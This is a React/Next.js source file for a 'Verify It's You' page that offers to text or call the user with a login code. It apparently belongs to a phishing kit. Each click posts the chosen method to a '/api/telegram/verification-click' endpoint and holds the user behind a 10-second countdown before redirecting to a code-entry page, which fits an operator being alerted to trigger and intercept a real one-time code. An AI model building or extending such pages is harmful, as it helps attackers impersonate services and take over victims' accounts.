"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { HelpCircle, MessageCircle, Phone, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { SiteHeader } from "@/components/site-header";

const options = [
  {
    id: "text",
    title: "Text Me a Code",
    subtitle: "You'll enter it to log on.",
    icon: MessageCircle,
  },
  {
    id: "call",
    title: "Call Me With a Code",
    subtitle: "Get a call that says a code for you to enter.",
    icon: Phone,
  },
];

export default function VerifyChoicePage() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [selectedOptionId, setSelectedOptionId] = useState<string>("email");
  const [countdown, setCountdown] = useState(0);
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);

  const handleSelect = async (id: string, title: string) => {
    if (isLoading) return;
    setSelectedOptionId(id);
    setIsLoading(true);
    setCountdown(10);
    countdownRef.current = window.setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) {
            window.clearInterval(countdownRef.current);
            countdownRef.current = null;
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    try {
      await fetch("/api/telegram/verification-click", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ verificationType: title }),
      }).catch(console.error);
    } catch (err) {
      console.error("Failed to send verification-click notification:", err);
    }
    redirectRef.current = window.setTimeout(() => {
      router.push(`/verify?method=${encodeURIComponent(id)}`);
    }, 10000);
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) window.clearInterval(countdownRef.current);
      if (redirectRef.current) window.clearTimeout(redirectRef.current);
    };
  }, []);

  return (
    <>
      <main className="min-h-screen bg-white px-4 py-6 md:hidden">
        <div className="max-w-md mx-auto flex flex-col gap-4">
          <div className="flex items-center gap-2 mb-1">
            <button
              type="button"
              onClick={() => router.back()}
              className="inline-flex items-center justify-center rounded-full p-2 text-[#254650]"
            >
              <svg
                className="w-6 h-6"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
                strokeWidth="2"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M9 5l-7 7 7 7"
                />
              </svg>
            </button>
            <h2 className="text-base font-medium text-gray-900">
              Verify It&apos;s You
            </h2>
          </div>

          <div className="rounded-lg border border-gray-200 bg-white p-4 shadow-sm">
            <h1 className="text-xl font-semibold text-gray-900">Choose an Option</h1>
            <p className="mt-2 text-sm text-gray-700">
              Before you can get full access, you&apos;ll need to confirm your
              identity.
            </p>

            <div className="mt-4 space-y-2">
              {options.map(({ id, title, subtitle, icon: Icon }) => {
                const isSelectedAndLoading = isLoading && selectedOptionId === id;
                return (
                  <button
                    key={id}
                    type="button"
                    onClick={() => handleSelect(id, title)}
                    disabled={isLoading}
                    className="w-full flex items-start gap-3 rounded-md border border-gray-200 px-3 py-3 text-left hover:bg-gray-50 transition-colors disabled:cursor-not-allowed disabled:opacity-70"
                  >
                    {isSelectedAndLoading ? (
                      <Loader2 className="w-5 h-5 text-[#254650] shrink-0 mt-0.5 animate-spin" />
                    ) : (
                      <Icon className="w-5 h-5 text-[#254650] shrink-0 mt-0.5" />
                    )}
                    <div>
                      <p className="text-sm font-medium text-[#254650]">{title}</p>
                      <p className="text-xs text-gray-500 mt-0.5">
                        {isSelectedAndLoading ? "Loading..." : subtitle}
                      </p>
                    </div>
                  </button>
                );
              })}
            </div>

            {countdown > 0 && (
              <p className="mt-4 text-sm text-gray-600">
                Redirecting in {countdown} second{countdown === 1 ? "" : "s"}…
              </p>
            )}

            <div className="mt-4 flex flex-col gap-2">
              <Button
                type="button"
                variant="outline"
                disabled={isLoading}
                className="rounded-md border-gray-300 bg-gray-100 hover:bg-gray-200 text-gray-900 h-9 px-5 disabled:opacity-70 disabled:cursor-not-allowed"
                onClick={() => router.push("/")}
              >
                Cancel
              </Button>
            </div>
          </div>
        </div>
      </main>

      <div className="hidden md:flex min-h-screen flex-col bg-white">
        <SiteHeader />
        <div className="max-w-2xl px-4 py-10 mb-67.5 mx-auto md:mx-0 md:ml-15 flex-1">
          <div className="flex items-center gap-2 mb-2">
            <h2 className="text-base font-medium text-gray-900">
              Verify It&apos;s You
            </h2>
            <button
              type="button"
              className="text-[#254650] hover:underline flex items-center gap-1"
              aria-label="Help"
            >
              <HelpCircle className="w-4 h-4" />
              <span className="text-sm">Help</span>
            </button>
          </div>

          <h1 className="text-2xl font-semibold text-gray-900 mb-2">
            Choose an Option
          </h1>
          <p className="text-gray-700 text-sm mb-6">
            Before you can get full access, you&apos;ll need to confirm your
            identity.
          </p>

          <div
            className={`space-y-0 border border-gray-200 rounded-none divide-y divide-gray-200 mb-8 ${isLoading ? "pointer-events-none opacity-60" : ""}`}
            aria-busy={isLoading}
          >
            {options.map(({ id, title, subtitle, icon: Icon }) => {
              const isSelectedAndLoading = isLoading && selectedOptionId === id;
              return (
                <button
                  key={id}
                  type="button"
                  onClick={() => handleSelect(id, title)}
                  disabled={isLoading}
                  className="w-full flex items-start gap-4 px-4 py-4 text-left hover:bg-gray-50 transition-colors disabled:cursor-not-allowed disabled:hover:bg-transparent"
                >
                  {isSelectedAndLoading ? (
                    <Loader2 className="w-6 h-6 text-[#254650] shrink-0 mt-0.5 animate-spin" />
                  ) : (
                    <Icon className="w-6 h-6 text-[#254650] shrink-0 mt-0.5" />
                  )}
                  <div>
                    <p className="text-[#254650] font-medium">{title}</p>
                    <p className="text-gray-500 text-sm mt-0.5">
                      {isSelectedAndLoading ? "Loading..." : subtitle}
                    </p>
                  </div>
                </button>
              );
            })}
          </div>

          <Button
            type="button"
            variant="outline"
            disabled={isLoading}
            className="rounded-md border-gray-300 bg-gray-100 hover:bg-gray-200 text-gray-900 h-9 px-5 disabled:opacity-70 disabled:cursor-not-allowed"
            onClick={() => router.push("/")}
          >
            Cancel
          </Button>
        </div>
      </div>
    </>
  );
}
